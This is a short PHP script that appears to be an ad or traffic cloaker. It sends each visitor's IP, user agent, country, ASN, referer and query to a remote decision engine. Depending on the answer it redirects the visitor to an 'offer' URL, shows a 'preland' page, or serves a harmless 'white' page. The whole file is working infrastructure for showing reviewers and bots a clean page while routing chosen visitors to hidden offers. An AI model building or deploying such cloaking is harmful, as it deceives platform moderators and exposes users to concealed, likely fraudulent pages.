<?php

if (is_file('/etc/web-klo/config.php')) {
    require '/etc/web-klo/config.php';
}

$KLO_ENGINE   = getenv('KLO_ENGINE') ?: 'http://127.0.0.1:8090';
$KLO_KEY      = getenv('KLO_KEY') ?: '';
$KLO_CAMPAIGN = getenv('KLO_CAMPAIGN') ?: '';
$WHITE_FILE   = __DIR__ . '/ind-w.html';

function klo_ip(): string {
    foreach (['HTTP_CF_CONNECTING_IP', 'HTTP_X_FORWARDED_FOR', 'HTTP_X_REAL_IP', 'REMOTE_ADDR'] as $key) {
        if (!empty($_SERVER[$key])) {
            return trim(explode(',', $_SERVER[$key])[0]);
        }
    }
    return '0.0.0.0';
}

function klo_query(): array {
    $out = [];
    foreach ($_GET as $key => $value) {
        $out[$key] = is_array($value) ? implode(',', $value) : (string) $value;
    }
    return $out;
}

function klo_post(string $url, string $key, array $payload): ?array {
    if ($key === '' || !function_exists('curl_init')) {
        return null;
    }
    $ch = curl_init($url);
    curl_setopt_array($ch, [
        CURLOPT_POST => true,
        CURLOPT_POSTFIELDS => json_encode($payload, JSON_UNESCAPED_SLASHES),
        CURLOPT_HTTPHEADER => [
            'Content-Type: application/json',
            'X-Klo-Key: ' . $key,
        ],
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_CONNECTTIMEOUT => 5,
        CURLOPT_TIMEOUT => 10,
        CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
    ]);
    $raw = curl_exec($ch);
    $code = (int) curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);
    if (!is_string($raw) || $raw === '' || $code !== 200) {
        return null;
    }
    $json = json_decode($raw, true);
    return is_array($json) ? $json : null;
}

function klo_white(string $file): void {
    if (is_file($file)) {
        include $file;
        return;
    }
    echo '<!doctype html><title></title>';
}

$host = strtolower((string) preg_replace('/:\d+$/', '', $_SERVER['HTTP_HOST'] ?? ''));
$decision = klo_post(rtrim($KLO_ENGINE, '/') . '/v1/decide', $KLO_KEY, [
    'campaign' => $KLO_CAMPAIGN,
    'host' => $host,
    'ip' => klo_ip(),
    'user_agent' => $_SERVER['HTTP_USER_AGENT'] ?? '',
    'accept_language' => $_SERVER['HTTP_ACCEPT_LANGUAGE'] ?? '',
    'headers' => [
        'cf-ipcountry' => $_SERVER['HTTP_CF_IPCOUNTRY'] ?? '',
        'cf-asn' => $_SERVER['HTTP_CF_ASN'] ?? '',
        'referer' => $_SERVER['HTTP_REFERER'] ?? '',
    ],
    'query' => klo_query() ?: new stdClass(),
    'path' => parse_url($_SERVER['REQUEST_URI'] ?? '/', PHP_URL_PATH) ?: '/',
]);

$action = is_array($decision) ? ($decision['action'] ?? '') : '';
$url = is_array($decision) ? (string) ($decision['url'] ?? '') : '';

if ($action === 'redirect_offer' && $url !== '') {
    $qs = $_SERVER['QUERY_STRING'] ?? '';
    if ($qs !== '' && strpos($url, '?') === false) {
        $url .= '?' . $qs;
    } elseif ($qs !== '' && strpos($url, $qs) === false) {
        $url .= '&' . $qs;
    }
    header('Location: ' . $url, true, 302);
    return;
}

if ($action === 'show_preland' && $url !== '') {
    $OFFER_URL = $url;
    $go = __DIR__ . '/go.html';
    if (is_file($go)) {
        include $go;
        return;
    }
    echo '<!doctype html><a href="' . htmlspecialchars($url, ENT_QUOTES, 'UTF-8') . '">Continue</a>';
    return;
}

klo_white($WHITE_FILE);
